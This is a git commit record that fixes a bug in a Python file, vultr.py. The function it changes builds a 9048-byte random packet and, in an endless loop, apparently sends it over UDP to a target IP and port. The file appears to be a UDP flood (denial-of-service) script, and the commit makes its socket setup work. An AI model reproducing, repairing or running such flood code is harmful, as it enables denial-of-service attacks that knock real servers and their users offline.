fe9e8b75b3e00d1c65ae64e3b224052f77548c83
PhynX <48216256+PhynX404@users.noreply.github.com>
2021-10-11 00:03:10 +0700

    Update vultr.py

--- vultr.py
+++ vultr.py
@@ -16,7 +16,7 @@ def main():
 
 def etek(ip, port):
   pkt = random._urandom(9048)
-  s = socket.socket(socket.AF_INET, socket.DGRAM)
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   while True:
     try:
